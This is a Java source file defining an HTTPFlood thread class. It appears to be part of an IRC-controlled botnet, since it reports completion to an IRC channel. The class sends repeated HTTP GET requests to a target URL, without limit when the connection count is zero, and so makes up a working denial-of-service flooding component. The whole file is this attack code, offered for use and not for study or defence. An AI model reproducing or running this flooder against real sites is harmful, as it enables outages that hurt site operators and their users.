import java.net.URL;
import java.net.HttpURLConnection;
/**
 * HTTPFlood Class
 * @author Nathan
 *
 */
public class HTTPFlood extends Thread 
{
	/**
	 * Credits to Jeebles for this class!
	 */
	
	/**
	 * Constructor, sets the url, delay and connections
	 */
	public HTTPFlood(String url, int delay, int connections) 
	{
		this.url = url;
		this.delay = delay;
		this.connections = connections;
	}
	/**
	 * Httpfloods on a new Thread
	 */
	@SuppressWarnings("deprecation")
	public void run() 
	{
		while(httpFlooding && (this.count < this.connections || this.connections == 0)) 
		{
			try 
			{
				HttpURLConnection.setFollowRedirects(false);
				HttpURLConnection conn = (HttpURLConnection)(new URL(this.url)).openConnection();
				conn.setRequestMethod("GET");
				conn.getResponseCode();
				conn = null;
				count++;
			} catch(Exception e) {
			} finally {
				try {
					Thread.sleep(this.delay);
				} catch(InterruptedException ie) {
				}
			}
		}
		IRC.sendMessage(Config.getChannel(), "Flooding finished!");
		stop();
	}
	
	private String url;
	private int delay;
	private int connections;
	private int count = 0;
	public static boolean httpFlooding = false;

}